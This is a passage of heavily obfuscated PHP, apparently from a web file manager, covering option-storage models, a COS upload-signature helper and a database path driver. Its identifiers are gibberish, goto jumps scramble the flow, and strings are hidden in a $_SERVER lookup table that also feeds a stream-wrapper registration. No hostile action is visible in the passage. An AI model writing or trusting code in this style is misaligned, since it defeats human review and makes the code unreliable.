= is_array($CÑ¬ºİ©·Å) ? $CÑ¬ºİ©·Å : array(); for ($d³ŞËÃª = 0; $d³ŞËÃª < count($CÑ¬ºİ©·Å); $d³ŞËÃª += $eÜ÷êØÅõ) { $Bø’‡ç‘×„ = array_slice($CÑ¬ºİ©·Å, $d³ŞËÃª, $eÜ÷êØÅõ); if (!is_array($Bø’‡ç‘×„) || count($Bø’‡ç‘×„) == 0) { break; } $C‘Éø¼ºµ÷[$aÅô”Èâéç[260]][$bª›œ°îŒ†][1] = $Bø’‡ç‘×„; $this->optionsValue($C‘Éø¼ºµ÷); $aŠ‹÷¿­ªŒ += parent::delete($B£·Ï³Ğ„ã); } goto Cá¬Á’¥Àô; Cá¬Á’¥Àô: return $aŠ‹÷¿­ªŒ; goto f—µŠğ“ÏÓ; f—µŠğ“ÏÓ: } private function findWhereField($A»«Ë‹É‚) { $cÛ¼ÀÒ¯” =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a­ŠÒ‹¶œ = self::SQL_WHERE_IN_CHUNK; if (!is_array($A»«Ë‹É‚) || !is_array($A»«Ë‹É‚[$cÛ¼ÀÒ¯”[260]])) { return !1; } foreach ($A»«Ë‹É‚[$cÛ¼ÀÒ¯”[260]] as $cÆã·„‹ => $eÑÚß–ƒ) { if (is_array($eÑÚß–ƒ) && isset($eÑÚß–ƒ[0]) && is_string($eÑÚß–ƒ[0]) && strtolower($eÑÚß–ƒ[0]) == $cÛ¼ÀÒ¯”[7] && is_array($eÑÚß–ƒ[1]) && count($eÑÚß–ƒ[1]) > $a­ŠÒ‹¶œ) { ignore_timeout(); return $cÆã·„‹; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\117\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($AÃ—çŒ’ = false, $E‹½åÕ‹Ï† = "\x6d\157\x64\151\x66\171\x54\151\155\145", $cÉùìàØÛÃ = false) { $cØ÷Ï‹ŸÁÚ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cØ÷Ï‹ŸÁÚ) { return $AÃ—çŒ’ ? null : array(); } if (!$AÃ—çŒ’) { $cØ÷Ï‹ŸÁÚ = array_filter(array_values($cØ÷Ï‹ŸÁÚ)); return array_sort_by($cØ÷Ï‹ŸÁÚ, $E‹½åÕ‹Ï†, $cÉùìàØÛÃ); } return $cØ÷Ï‹ŸÁÚ[$_SERVER[ÚŠ•´ÍéÒÑÔ][361] . $AÃ—çŒ’]; } public function insert($D“Ò—ŒèŞ) { goto eçÏÎ†ß‘ø; cêÏÖï°¬Ğ: return $e‚ôÖß–; goto A‘­ôïá¾©; eó‰¼ÆÒœ: $e‚ôÖß– = $e‚ôÖß– ? $e‚ôÖß– : 0; $D“Ò—ŒèŞ[$F­§‰¹‹Š[364]] = ++$e‚ôÖß–; $D“Ò—ŒèŞ[$F­§‰¹‹Š[184]] = time(); goto A¾ë¾–”¼; eçÏÎ†ß‘ø: $F­§‰¹‹Š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D“Ò—ŒèŞ = array_field_key($D“Ò—ŒèŞ, $this->field); $e‚ôÖß– = Model($this->modelType)->get($F­§‰¹‹Š[362], $this->optionType . $F­§‰¹‹Š[363]); goto eó‰¼ÆÒœ; A¾ë¾–”¼: $D“Ò—ŒèŞ[$F­§‰¹‹Š[107]] = time(); Model($this->modelType)->set($F­§‰¹‹Š[362], $e‚ôÖß–, $this->optionType . $F­§‰¹‹Š[363]); Model($this->modelType)->set($F­§‰¹‹Š[361] . $e‚ôÖß–, $D“Ò—ŒèŞ, $this->optionType); goto cêÏÖï°¬Ğ; A‘­ôïá¾©: } public function update($Fåñ¨ùğ°Ê, $Ašİ¸º­ƒÊ) { goto F™­š­ª‹; F™­š­ª‹: $D¯‘œĞ³Ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Ašİ¸º­ƒÊ = array_field_key($Ašİ¸º­ƒÊ, $this->field); $dçá…âë„ = $this->listData($Fåñ¨ùğ°Ê); goto fè“ÖÉœÇ; e‰‰²‡İ÷Ü: return Model($this->modelType)->set($D¯‘œĞ³Ç[361] . $Fåñ¨ùğ°Ê, $Ašİ¸º­ƒÊ, $this->optionType); goto B®àÛÅˆù; fè“ÖÉœÇ: if (!$dçá…âë„) { return !1; } $Ašİ¸º­ƒÊ = array_merge($dçá…âë„, $Ašİ¸º­ƒÊ); $Ašİ¸º­ƒÊ[$D¯‘œĞ³Ç[107]] = time(); goto e‰‰²‡İ÷Ü; B®àÛÅˆù: } public function remove($c„ïÓ‡Õš‹) { return Model($this->modelType)->remove($_SERVER[ÚŠ•´ÍéÒÑÔ][361] . $c„ïÓ‡Õš‹, $this->optionType); } public function clear() { $b®°ÑâÃ”­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Model($this->modelType)->remove($b®°ÑâÃ”­[362], $this->optionType . $b®°ÑâÃ”­[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($e£´³œí¼Ñ, $aˆ¶“Õ‹) { if (!$aˆ¶“Õ‹) { return !1; } $BÏÃŠß–œ¨ = $this->listData(); $BÏÃŠß–œ¨ = array_to_keyvalue($BÏÃŠß–œ¨, $e£´³œí¼Ñ); return isset($BÏÃŠß–œ¨[$aˆ¶“Õ‹]) ? $BÏÃŠß–œ¨[$aˆ¶“Õ‹] : !1; } public function findByName($F¶¡‡¸¤²Ô) { return $this->findByKey($_SERVER[ÚŠ•´ÍéÒÑÔ][28], $F¶¡‡¸¤²Ô); } protected function resetData($D‡ÊÚšâØ) { $B†–¸ÌÚ¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D‡ÊÚšâØ = is_array($D‡ÊÚšâØ) ? $D‡ÊÚšâØ : array(); $bãÖ™ÈŠÏ = array(); for ($eÚÇÁÕ´Ã¹ = 0; $eÚÇÁÕ´Ã¹ < count($D‡ÊÚšâØ); $eÚÇÁÕ´Ã¹++) { $bãÖ™ÈŠÏ[$B†–¸ÌÚ¦[361] . $D‡ÊÚšâØ[$eÚÇÁÕ´Ã¹][$B†–¸ÌÚ¦[364]]] = $D‡ÊÚšâØ[$eÚÇÁÕ´Ã¹]; } return Model($this->modelType)->set($bãÖ™ÈŠÏ, !1, $this->optionType); } private function getAutoName($F±”ò÷Ş) { $FàˆÛì©õî = array_to_keyvalue($this->listData(), $_SERVER[ÚŠ•´ÍéÒÑÔ][28]); if (!$FàˆÛì©õî || !isset($FàˆÛì©õî[$F±”ò÷Ş])) { return $F±”ò÷Ş; } for ($C§­‹×øñ = 1; $C§­‹×øñ < count($FàˆÛì©õî); $C§­‹×øñ++) { $f‚Ù—†ÄØ = $F±”ò÷Ş . "\50{$C§­‹×øñ}\x29"; if (!isset($FàˆÛì©õî[$f‚Ù—†ÄØ])) { return $f‚Ù—†ÄØ; } } return $f‚Ù—†ÄØ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($DÄ»ªˆ·Ê» = false, $E—ÚĞÕÄ¯Ñ = '', $fìå½Ë¶Åò = false) { goto C™á•Ì¡«; C™á•Ì¡«: $Fö¾Ù™Ïæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÙ‰ºÔ•ß = $this->cacheGet($E—ÚĞÕÄ¯Ñ); $c“º†Õ”Éà = $this->optionDefault($E—ÚĞÕÄ¯Ñ); goto E‹­¨«õŸ³; C¦‰ƒÔÒ¨: $this->cacheSet($E—ÚĞÕÄ¯Ñ, $fÙ‰ºÔ•ß); $fÙ‰ºÔ•ß = array_merge($c“º†Õ”Éà, $fÙ‰ºÔ•ß); return $DÄ»ªˆ·Ê» ? $fÙ‰ºÔ•ß[$DÄ»ªˆ·Ê»] : $fÙ‰ºÔ•ß; goto cÚù«¯«´¡; E¿à·æƒ£: $fÙ‰ºÔ•ß = $this->where($AßÂî‹ÇÎ)->select(); $fÙ‰ºÔ•ß = array_to_keyvalue($fÙ‰ºÔ•ß, $Fö¾Ù™Ïæ[89], $Fö¾Ù™Ïæ[356]); foreach ($fÙ‰ºÔ•ß as $DÚ†Ê®ç‘˜ => $BŠè‰„½«) { if ($fìå½Ë¶Åò || in_array($DÚ†Ê®ç‘˜, $this->jsonField)) { $fÙ‰ºÔ•ß[$DÚ†Ê®ç‘˜] = json_decode($BŠè‰„½«, !0); } } goto C¦‰ƒÔÒ¨; E‹­¨«õŸ³: $c“º†Õ”Éà = is_array($c“º†Õ”Éà) ? $c“º†Õ”Éà : array(); if (is_array($fÙ‰ºÔ•ß)) { $fÙ‰ºÔ•ß = array_merge($c“º†Õ”Éà, $fÙ‰ºÔ•ß); return $DÄ»ªˆ·Ê» ? isset($fÙ‰ºÔ•ß[$DÄ»ªˆ·Ê»]) ? $fÙ‰ºÔ•ß[$DÄ»ªˆ·Ê»] : null : $fÙ‰ºÔ•ß; } $AßÂî‹ÇÎ = $this->filterWhere(array($Fö¾Ù™Ïæ[29] => $E—ÚĞÕÄ¯Ñ)); goto E¿à·æƒ£; cÚù«¯«´¡: } public function set($DŒÄ‰·øŠì, $e©Ö½Ší» = false, $eÊá›Ëˆö = '') { goto cï‘ßº¢¹; A×½« šª: $D«¥ºäÓà = is_array($DŒÄ‰·øŠì) ? $DŒÄ‰·øŠì : array($DŒÄ‰·øŠì => $e©Ö½Ší»); foreach ($D«¥ºäÓà as $e­¢à¼Ò„ˆ => $Fâ°ÊÛ˜Ğ) { if (is_array($Fâ°ÊÛ˜Ğ)) { $Fâ°ÊÛ˜Ğ = json_encode_force($Fâ°ÊÛ˜Ğ); } $this->checkLength($Fâ°ÊÛ˜Ğ, !1, $this->tableName . $Bõ±øÎïÌª[4] . $DŒÄ‰·øŠì); $Fâ°ÊÛ˜Ğ = self::textEncode($Fâ°ÊÛ˜Ğ); $D«¥ºäÓà = array($Bõ±øÎïÌª[29] => $eÊá›Ëˆö, $Bõ±øÎïÌª[89] => $e­¢à¼Ò„ˆ, $Bõ±øÎïÌª[356] => $Fâ°ÊÛ˜Ğ); $C…¿©Ïğïò[] = $this->filterWhere($D«¥ºäÓà); } if (!$C…¿©Ïğïò) { return !0; } goto dÌ×ç¶‡Šš; cï‘ßº¢¹: $Bõ±øÎïÌª =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->cacheRemove($eÊá›Ëˆö); $C…¿©Ïğïò = array(); goto A×½« šª; dÌ×ç¶‡Šš: return $this->addAll($C…¿©Ïğïò, array(), !0); goto Aá½‡ÆãÊĞ; Aá½‡ÆãÊĞ: } protected function optionDefault($Cø¶¤¦¼ŞÍ = '') { return !1; } public function setDeep($b¼³“É¿•, $FÒ…·Ã…Ê¯ = false, $e—¹±ëÆ²å = '') { $Fİ–‚ÀŸ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][93], $b¼³“É¿•); $f˜ÕÅÊî‘” = $this->get(); array_set_value($f˜ÕÅÊî‘”, $b¼³“É¿•, $FÒ…·Ã…Ê¯); $this->set($Fİ–‚ÀŸ[0], $f˜ÕÅÊî‘”[$Fİ–‚ÀŸ[0]], $e—¹±ëÆ²å); } public function remove($b…ÀÎ†£Ö†, $b¯½±è»ìÃ = '') { $DµæôÁ‡¡š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->cacheRemove($b¯½±è»ìÃ); $a­ÍŸËÊñà = $this->filterWhere(array($DµæôÁ‡¡š[89] => $b…ÀÎ†£Ö†, $DµæôÁ‡¡š[29] => $b¯½±è»ìÃ)); if (is_null($b…ÀÎ†£Ö†)) { unset($a­ÍŸËÊñà[$DµæôÁ‡¡š[89]]); } return $this->where($a­ÍŸËÊñà)->delete(); } public function cacheSet($A‘¯ÓºôÀ­, $C´ƒ…ˆğ¦š = false) { return Cache::set($this->cacheKey($A‘¯ÓºôÀ­), $C´ƒ…ˆğ¦š); } public function cacheGet($FêÜ‚ø’ø) { return Cache::get($this->cacheKey($FêÜ‚ø’ø)); } public function cacheRemove($dâğàÙÚ¹÷) { return Cache::remove($this->cacheKey($dâğàÙÚ¹÷)); } protected function filterWhere($D¸ºÉœÕçÛ) { return $D¸ºÉœÕçÛ; } protected function cacheKey($eß²Üé‡Ò®) { return $eß²Üé‡Ò®; } } goto D¡ŸŒ„®›Œ; eÑèˆ—¬†: $_SERVER[$_SERVER[Ÿ²ù¬][52]] = ("\71\64\71\60".base64_decode('MzE='))+0;$_4Mse="thfTvYkvzBnvJyhb8E8qJS5wam53z7YYxFQqYXJSHyi9MtgxVMnECQcWjeigFNX5pdujr";; stream_wrapper_register($_SERVER[Ÿ²ù¬][53], $_SERVER[Ÿ²ù¬][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b®æ Ëò¬Â, $f×Ô§ò†‰‰) { $E…ÔÍ‹âÜˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset(self::$_methodList[$b®æ Ëò¬Â])) { return @call_user_func_array(self::$_methodList[$b®æ Ëò¬Â], $f×Ô§ò†‰‰); } else { if (method_exists($this, $b®æ Ëò¬Â)) { return call_user_func_array(array($this, $b®æ Ëò¬Â), $f×Ô§ò†‰‰); } else { think_exception(__CLASS__ . $E…ÔÍ‹âÜˆ[4] . $b®æ Ëò¬Â . $E…ÔÍ‹âÜˆ[5]); } } } public static function __callStatic($C›¿Êéò», $CƒÆˆ²ÅÓ) { if (isset(self::$_methodListStatic[$C›¿Êéò»])) { return call_user_func_array(self::$_methodListStatic[$C›¿Êéò»], $CƒÆˆ²ÅÓ); } else { if (method_exists(self, $C›¿Êéò»)) { return call_user_func_array(array(self, $C›¿Êéò»), $CƒÆˆ²ÅÓ); } else { show_json("{$C›¿Êéò»}\x28\x29\40\x6e\x6f\164\40\x65\170\151\x73\164\73", !1); } } } public static function addMethod($dÂ‚‚Ñª›Š, $bËÏ¦Ş‰Ì) { self::$_methodList[$dÂ‚‚Ñª›Š] = $bËÏ¦Ş‰Ì; } public static function addMethodStatic($D”â„ÍÛ±Ì, $C‚ôñÉ­³) { self::$_methodListStatic[$D”â„ÍÛ±Ì] = $C‚ôñÉ­³; } } goto EŸÕ…íˆ„; Bï›‹†ë¢œ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($f´ªéÈ Ã) { parent::__construct($f´ªéÈ Ã); $this->signatureVersion($_SERVER[ÚŠ•´ÍéÒÑÔ][197]); } public function uploadFormData($Bğé¢è×öÍ, $Bë„™—¡¡¨ = 3600) { goto E•È«²í©§; FáÇˆé‚Š¦: $aÖ–‘ùßÎè = sha1($f¶‰â¥‹Å); $EÉ’ñê¢î˜ = hash_hmac($D­“•ñ‹Òô[215], $aÖ–‘ùßÎè, $B„Êµ»ÈÛ); $F‹ŞøòÜ½« = array($D­“•ñ‹Òô[1089] => $AÚ†¢–Õîø, $D­“•ñ‹Òô[1093] => $c¼âøëÂ, $D­“•ñ‹Òô[1097] => base64_encode($f¶‰â¥‹Å), $D­“•ñ‹Òô[1094] => $Cù÷ÂÈÃŒç, $D­“•ñ‹Òô[1095] => $this->accessKey, $D­“•ñ‹Òô[1098] => $DÑƒîŸ®äŒ, $D­“•ñ‹Òô[1099] => $EÉ’ñê¢î˜, $D­“•ñ‹Òô[166] => $this->getHost()); goto fÑÜ¬İ¾ãí; fÚ‡¯´Íñ¾: $c¼âøëÂ = $D­“•ñ‹Òô[1085]; $F‘Åˆ×Œ = gmdate($D­“•ñ‹Òô[1086], time() + $Bë„™—¡¡¨); $DÑƒîŸ®äŒ = (string) time() . $D­“•ñ‹Òô[67] . (string) (time() + $Bë„™—¡¡¨); goto f§ÉòŸåŒ†; f§ÉòŸåŒ†: $f¶‰â¥‹Å = array($D­“•ñ‹Òô[1087] => $F‘Åˆ×Œ, $D­“•ñ‹Òô[1088] => array(array($D­“•ñ‹Òô[1089] => $AÚ†¢–Õîø), array($D­“•ñ‹Òô[1090] => $this->bucket), array($D­“•ñ‹Òô[1091], $D­“•ñ‹Òô[1092], $D­“•ñ‹Òô[33]), array($D­“•ñ‹Òô[1093] => $c¼âøëÂ), array($D­“•ñ‹Òô[1094] => $Cù÷ÂÈÃŒç), array($D­“•ñ‹Òô[1095] => $this->accessKey), array($D­“•ñ‹Òô[1096] => $DÑƒîŸ®äŒ))); $f¶‰â¥‹Å = json_encode($f¶‰â¥‹Å); $B„Êµ»ÈÛ = hash_hmac($D­“•ñ‹Òô[215], $DÑƒîŸ®äŒ, $this->secret); goto FáÇˆé‚Š¦; E•È«²í©§: $D­“•ñ‹Òô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÚ†¢–Õîø = $D­“•ñ‹Òô[182]; $Cù÷ÂÈÃŒç = $D­“•ñ‹Òô[215]; goto fÚ‡¯´Íñ¾; fÑÜ¬İ¾ãí: return $F‹ŞøòÜ½«; goto aÏŸáÂÔÅƒ; aÏŸáÂÔÅƒ: } public function fileOutLink($b¦–‚»ÅË¼) { $CŠÀØŒøá =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (substr($b¦–‚»ÅË¼, 0, 7) == $CŠÀØŒøá[1100]) { $b¦–‚»ÅË¼ = $CŠÀØŒøá[1101] . substr($b¦–‚»ÅË¼, 7); } header($CŠÀØŒøá[153] . $b¦–‚»ÅË¼); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($EĞ§İ×ºß„) { $this->pathParse = $EĞ§İ×ºß„; $this->model = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][1102]); } public function getPath($bŸÄøÕÏ‘ñ) { return trim($bŸÄøÕÏ‘ñ, $_SERVER[ÚŠ•´ÍéÒÑÔ][8]); } public function pathFather($b¬¢©ç³òè) { $bÙõ‚êøù = $this->parse($b¬¢©ç³òè); $bÙõ‚êøù = $this->infoSimple($b¬¢©ç³òè); return $bÙõ‚êøù ? $bÙõ‚êøù[$_SERVER[ÚŠ•´ÍéÒÑÔ][457]] : !1; } public function getPathName($A´ø§ÌÍ§ñ) { $D»‹¹îó«õ = $this->infoSimple($A´ø§ÌÍ§ñ); return $D»‹¹îó«õ ? $D»‹¹îó«õ[$_SERVER[ÚŠ•´ÍéÒÑÔ][28]] : !1; } public function getPathOuter($A‹ïˆ“ÅòÎ) { if (!$A‹ïˆ“ÅòÎ) { return $A‹ïˆ“ÅòÎ; } $Eœä¿×ìˆ³ = $this->parse($A‹ïˆ“ÅòÎ); return KodIO::make($Eœä¿×ìˆ³[$_SERVER[ÚŠ•´ÍéÒÑÔ][364]]); } public function copyFolderFromIO($cÎ¸¡Â‰¡, $Aôò‚Ğç¯ß, $F™¤ª·‡¡ë, $aÓÜôÊ®â…, $Cé¡·…Œª) { $C×Ü‰ëâîË = $this->model->copyFolderFromIO($cÎ¸¡Â‰¡, $Aôò‚Ğç¯ß, $F™¤ª·‡¡ë, $aÓÜôÊ®â…, $Cé¡·…Œª); return KodIO::make($C×Ü‰ëâîË); } public function isParentOf($fšíËëÂğä, $CË¹äØ‹é) { return $this->model->isParentOf($fšíËëÂğä, $CË¹äØ‹é); } public function mkfile($bùÆÌ¹Ø÷È, $bÜŸƒÀß¾Š = '', $e¦·…†¡¹ = REPEAT_RENAME) { $c°Ô‚„Ã³ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a´ò°ØŠ‘© = $this->parse($bùÆÌ¹Ø÷È); $bùÆÌ¹Ø÷È = $a´ò°ØŠ‘©[$c°Ô‚„Ã³[364]]; for ($dš±œ»²­‡ = 0; $dš±œ»²­‡ < count($a´ò°ØŠ‘©[$c°Ô‚„Ã³[1103]]); $dš±œ»²­‡++) { $cèÆ×áÇª¼ = $a´ò°ØŠ‘©[$c°Ô‚„Ã³[1103]][$dš±œ»²­‡]; if ($dš±œ»²­‡ == count($a´ò°ØŠ‘©[$c°Ô‚„Ã³[1103]]) - 1) { $bùÆÌ¹Ø÷È = $this->model->mkfile($bùÆÌ¹Ø÷È, $cèÆ×áÇª¼, $bÜŸƒÀß¾Š, $e¦·…†¡¹); break; } $bùÆÌ¹Ø÷È = $this->model->mkdir($bùÆÌ¹Ø÷È, $cèÆ×áÇª¼, REPEAT_SKIP); } return $this->getPathOuter($bùÆÌ¹Ø÷È); } public function mkdir($e™İÑâ¾, $aéÜŠÔ¬Ïò = REPEAT_SKIP) { $c§§£´ê»¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DŒŠ•²ñâ = $this->parse($e™İÑâ¾); $e™İÑâ¾ = $DŒŠ•²ñâ[$c§§£´ê»¾[364]]; for ($b¨Û©×× = 0; $b¨Û©×× < count($DŒŠ•²ñâ[$c§§£´ê»¾[1103]]); $b¨Û©××++) { $EêÒò‘‹®´ = $DŒŠ•²ñâ[$c§§£´ê»¾[1103]][$b¨Û©××]; $e™İÑâ¾ = $this->model->mkdir($e™İÑâ¾, $EêÒò‘‹®´, $aéÜŠÔ¬Ïò); } return $this->getPathOuter($e™İÑâ¾); } public function copyFile($fÙƒ¼àà , $bë°œªƒô, $bÁº®’ÔÎ‡ = REPEAT_REPLACE) { $déôÙ­Çİ— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D…‹…½Éùà = $this->parse($bë°œªƒô); $D³˜½ê—–¿ = $this->model->copy($fÙƒ¼àà , $D…‹…½Éùà[$déôÙ­Çİ—[364]], $bÁº®’ÔÎ‡, $D…‹…½Éùà[$déôÙ­Çİ—[75]]); return $D³˜½ê—–¿ ? $this->getPathOuter($D³˜½ê—–¿) : !1; } public function moveFile($e†Šù‡°“, $cŞ¢«³È÷Œ, $c›õ˜ÊŠ¶„ = REPEAT_REPLACE) { $BàÈÎ¿øš =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FäâŠÃÉ¨¡ = $this->parse($cŞ¢«³È÷Œ); $B‚Úì¥¶¼ = $this->model->move($e†Šù‡°“, $FäâŠÃÉ¨¡[$BàÈÎ¿øš[364]], $c›õ˜ÊŠ¶„, $FäâŠÃÉ¨¡[$BàÈÎ¿øš[75]]); return $B‚Úì¥¶¼ ? $this->getPathOuter($B‚Úì¥¶¼) : !1; } public function copy($dºÙ®ğÙ®é, $E¶ˆ‚Û§ƒ, $Dó“œµ—ñ = REPEAT_REPLACE) { $E×Ö©ˆ¾• = $this->parse($E¶ˆ‚Û§ƒ); $c•¿¶”¯¢ = $this->model->copy($dºÙ®ğÙ®é, $E×Ö©ˆ¾•[$_SERVER[ÚŠ•´ÍéÒÑÔ][364]], $Dó“œµ—ñ); return $c•¿¶”¯¢ ? $this->getPathOuter($c•¿¶”¯¢) : !1; } public function move($BÊÍŸæÇ—¥, $b‚ÊÂ’½®Ø, $E…µ±›¿Õ = REPEAT_REPLACE) { $cœÈàš‰¼± = $this->parse($b‚ÊÂ’½®Ø); $e“Ä‹†‡ = $this->model->move($BÊÍŸæÇ—¥, $cœÈàš‰¼±[$_SERVER[ÚŠ•´ÍéÒÑÔ][364]], $E…µ±›¿Õ); return $e“Ä‹†‡ ? $this->getPathOuter($e“Ä‹†‡) : !1; } public function remove($añ¥£½šî, $B¬ôéØ±š¨ = true) { return $this->model->remove($añ¥£½šî, $B¬ôéØ±š¨); } public function rename($EŒ«šå¸·, $e×ÜöÄø÷Î) { $F²“–êê‡Œ = $this->model->rename($EŒ«šå¸·, $e×ÜöÄø÷Î); return $F²“–êê‡Œ ? $this->getPathOuter($EŒ«šå¸·) : $F²“–êê‡Œ; } public function size($e²½®Á) { $eîĞ‚ÕŞ° = $this->infoSimple($e²½®Á); return $eîĞ‚ÕŞ° ? $eîĞ‚ÕŞ°[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]] : 0; } public function infoSimple($A›£Â§‘í¼) { return $this->model->sourceInfo($A›£Â§‘í¼); } public function info($Bˆ¹¶À‰) { return $this->infoParse($Bˆ¹¶À‰); } public function infoAuth($a¥°Õ†Ÿ) { return $this->infoParse($a¥°Õ†Ÿ, !1, !0); } public function infoWithChildren($D¼Ê‹…ï¦Á) { return $this->infoParse($D¼Ê‹…ï¦Á, !0); } protected function infoParse($eĞ¦ßš›á, $c£¬ö‡Š™ = false, $E‰á›¼²ø„ = false) { if (!$c£¬ö‡Š™) { return $this->model->pathInfo($eĞ¦ßš›á, $E‰á›¼²ø„); } return $this->model->pathInfoMore($eĞ¦ßš›á); } public function infoFull($E’§ùº¦á£) { $d¾×äôÆÛ¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dˆß¼ñ»¨ = explode($d¾×äôÆÛ¹[8], $E’§ùº¦á£); $EŸ™ß¸š×Ë = implode($d¾×äôÆÛ¹[8], array_splice($dˆß¼ñ»¨, 1)); return $this->model->pathInfoByPath($dˆß¼ñ»¨[0], $EŸ™ß¸š×Ë); } public function hashSimple($c…Äİˆ¿ÀŒ) { $a’óËŒ¥Áƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e´š‹¯×ŒÂ = $this->infoWithChildren($c…Äİˆ¿ÀŒ); return $e´š‹¯×ŒÂ[$a’óËŒ¥Áƒ[159]][$a’óËŒ¥Áƒ[161]]; } public function hashMd5($Eùè®¯ˆô²) { $Aª˜Ô™äø„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $däòŸ¼ÎÄŠ = $this->infoWithChildren($Eùè®¯ˆô²); return $däòŸ¼ÎÄŠ[$Aª˜Ô™äø„[159]][$Aª˜Ô™äø„[160]]; } public function exist($bÜÆ”‘ÑÏ±) { $Bù£ÔÀôŞ• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A½È‚¼Å¾ª = $this->parse($bÜÆ”‘ÑÏ±); if (!$A½È‚¼Å¾ª[$Bù£ÔÀôŞ•[75]]) { return $this->isFile($bÜÆ”‘ÑÏ±) || $this->isFolder($bÜÆ”‘ÑÏ±); } $c¤‡šï‰ñæ = array($Bù£ÔÀôŞ•[365] => $A½È‚¼Å¾ª[$Bù£ÔÀôŞ•[364]], $Bù£ÔÀôŞ•[28] => $A½È‚¼Å¾ª[$Bù£ÔÀôŞ•[75]]); $fÙøÕ˜œ°ì = $this->model->where($c¤‡šï‰ñæ)->find(); return $fÙøÕ˜œ°ì ? !0 : !1; } public function isFile($AØ‡é®ÜÃ) { $E¿ŠÌ­†Ÿ’ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a‰ˆÒäå‰Ã = $this->infoSimple($AØ‡é®ÜÃ); return $a‰ˆÒäå‰Ã && $a‰ˆÒäå‰Ã[$E¿ŠÌ­†Ÿ’[367]] == $E¿ŠÌ­†Ÿ’[83] ? !1 : !0; } public function isFolder($B§ŠÊ«Éß) { $fëÖ¨ª¸¿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cøˆ¥¸—õ = $this->infoSimple($B§ŠÊ«Éß); return $Cøˆ¥¸—õ && $Cøˆ¥¸—õ[$fëÖ¨ª¸¿[367]] == $fëÖ¨ª¸¿[83] ? !0 : !1; } public function listPath($e•åñã¢‘¥, $DğÉËÛãºÛ = false) { $a¥£›†ÍáÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($e•åñã¢‘¥ == $a¥£›†ÍáÖ[33]) { return !1; } $EáÑõç¦¶ = array($a¥£›†ÍáÖ[365] => $e•åñã¢‘¥); if ($DğÉËÛãºÛ) { return $this->model->listSource($EáÑõç¦¶, -1); } return $this->model->listSource($EáÑõç¦¶); } public function has($BÄï ‘Š¸¦, $B£–ç§ÚŞ = false, $f´˜ö«ïÖ = null) { $bŒÆ”Š“ìÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D‹ßëó±ĞÖ = $this->infoWithChildren($BÄï ‘Š¸¦); if ($B£–ç§ÚŞ) { return array($bŒÆ”Š“ìÖ[189] => $D‹ßëó±ĞÖ[$bŒÆ”Š“ìÖ[189]], $bŒÆ”Š“ìÖ[188] => $D‹ßëó±ĞÖ[$bŒÆ”Š“ìÖ[188]]); } return $f´˜ö«ïÖ ? $D‹ßëó±ĞÖ[$bŒÆ”Š“ìÖ[189]] : $D‹ßëó±ĞÖ[$bŒÆ”Š“ìÖ[188]]; } public function listAll($Eêø¦¸œá’) { $dÍ—§›»Áƒ = IO::info($this->pathParse[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]]); if (!$dÍ—§›»Áƒ) { return array(); } return $this->model->listAll($Eêø¦¸œá’); } public function getContent($bâ§ƒ¸Š¥) { return $this->model->getContent($bâ§ƒ¸Š¥); } public function setContent($Eæ²™¯™ë, $e˜ö”š©Æ¦ = '') { return $this->model->setContent($Eæ²™¯™ë, $e˜ö”š©Æ¦); } public function fileSubstr($c«™Î‘ „¶, $EªÙ¢ÊÑ´, $C–‡ÉÊßï·) { return $this->model->fileSubstr($c«™Î‘ „¶, $EªÙ¢ÊÑ´, $C–‡ÉÊßï·); } public function download($DÅöÌ¶ƒ™š, $c©À„çê· = '') { $AŠ²†­»¹š = get_path_father($c©À„çê·); $Bîé ¸™”ˆ = get_path_this($c©À„çê·); $FÕº–¿¯ = $this->model->fileInfoGet($DÅöÌ¶ƒ™š); $BÄã®Üà¡ = IO::copy($FÕº–¿¯[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]], $AŠ²†­»¹š, !1, $Bîé ¸™”ˆ); return $BÄã®Üà¡; } public function upload($a×Í‹”™ù‰, $A°¿äÀÜ…§, $CõÎäë‚Íœ = false, $a…ÄÕ¶‰Ã = REPEAT_REPLACE) { $e¥ëğÔí• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B´Ñ—áæ = $this->parse($a×Í‹”™ù‰); $b½ââñ¥Üà = $this->model->addFile($B´Ñ—áæ[$e¥ëğÔí•[364]], $A°¿äÀÜ…§, $B´Ñ—áæ[$e¥ëğÔí•[75]], $CõÎäë‚Íœ, $a…ÄÕ¶‰Ã); 